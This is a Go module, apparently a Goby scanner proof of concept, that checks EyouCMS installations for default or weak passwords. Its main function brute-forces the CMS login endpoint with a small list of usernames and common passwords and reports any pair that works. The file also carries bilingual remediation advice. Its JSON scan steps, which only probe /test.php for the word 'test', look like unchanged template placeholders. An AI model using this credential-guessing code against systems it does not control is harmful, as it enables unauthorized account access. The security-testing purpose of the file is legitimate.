package exploits

import (
	"fmt"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "eyoucms Default Password",
    "Description": "<p>EyouCms is a stable and open source enterprise content management system developed based on the TP5.0 framework, which can be applied to secondary development in various industries. EyouCms has weak password login, and attackers can use brute force to enter the user system and cause system damage.</p>",
    "Product": "eyoucms",
    "Homepage": "http://www.eyoucms.com/",
    "DisclosureDate": "2022-02-23",
    "Author": "2826161446@qq.com",
    "FofaQuery": "title=\"易优\"&&body=\"易优\"",
    "GobyQuery": "title=\"易优\"&&body=\"易优\"",
    "Level": "1",
    "Impact": "<p>EyouCms has weak password login, and attackers can use brute force to enter the user system and cause system damage.</p>",
    "Recommendation": "<p>1. Modify the weak password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password",
        "2H1W"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "eyoucms 默认口令",
            "Product": "eyoucms",
            "Description": "<p>EyouCms是基于TP5.0框架为核心开发的稳定+开源的企业内容管理系统，可适用于各种行业二次开发。eyoucms存在弱口令登录，攻击者可以通过暴力破解进去到用户系统造成系统破坏<br></p>",
            "Recommendation": "<p>1、修改弱口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。<br></p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>eyoucms存在弱口令登录，攻击者可以通过暴力破解进去到用户系统造成系统破坏<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "eyoucms Default Password",
            "Product": "eyoucms",
            "Description": "<p>EyouCms is a stable and open source enterprise content management system developed based on the TP5.0 framework, which can be applied to secondary development in various industries. EyouCms has weak password login, and attackers can use brute force to enter the user system and cause system damage.<br></p>",
            "Recommendation": "<p>1. Modify the weak password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.<br></p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>EyouCms has weak password login, and attackers can use brute force to enter the user system and cause system damage.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2024-09-27",
    "Variables": {},
    "PocId": "9957"
}`

	//请求发送
	//注意：本函数传入的参数为hostInfo
	//注意：模板编写后务必全局替换后面随机字符AAAA, POC检测函数也需要同步修改
	sendPayloadyp2Vnbp5 := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		// 注意：vulPath是默认口令请求路径，请以 "/login" 的格式返回
		// 注意：vulInfo是默认口令，请以 "admin:123456" 的格式返回
		vulPath := `/eyoucms/index.php?m=user&c=Users&a=login`
		vulInfo := ``
		userInfoList := []string{`test`, `user`}
		pwdInfoList := []string{`admin123`, `admin`, `123456`, `12345678`, `666666`, `888888`}

		for _, userInfo := range userInfoList {
			for _, pwdInfo := range pwdInfoList {
				postRequestConfig := httpclient.NewPostRequestConfig(vulPath)
				postRequestConfig.VerifyTls = false
				postRequestConfig.FollowRedirect = false
				postRequestConfig.Header.Store("Accept-Language", " zh-CN,zh;q=0.9")
				postRequestConfig.Header.Store("X-Requested-With", " XMLHttpRequest")
				postRequestConfig.Header.Store("User-Agent", " Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36")
				postRequestConfig.Header.Store("Content-Type", " application/x-www-form-urlencoded; charset=UTF-8")
				postRequestConfig.Header.Store("Accept", "  application/json, text/javascript, */*; q=0.01")
				postRequestConfig.Header.Store("Accept-Encoding", " gzip, deflate")
				postRequestConfig.Data = fmt.Sprintf("username=%s&password=%s&vertify=&referurl=&website=website", userInfo, pwdInfo)
				//请求
				response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
				if err != nil {
					return false, vulInfo, vulPath
				}
				if strings.Contains(response.RawBody, "登录成功") {
					vulInfo = userInfo + ":" + pwdInfo
					return true, vulInfo, vulPath
				}
			}
		}
		return false, vulInfo, vulPath
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, vulInfo, vulPath := sendPayloadyp2Vnbp5(hostInfo)

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.Scheme() + "://" + vulInfo + "@" + hostInfo.HostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			_, vulInfo, _ := sendPayloadyp2Vnbp5(expResult.HostInfo)
			expResult.Output = `Please use "` + vulInfo + `" to login`
			expResult.Success = true
			return expResult
		},
	))
}
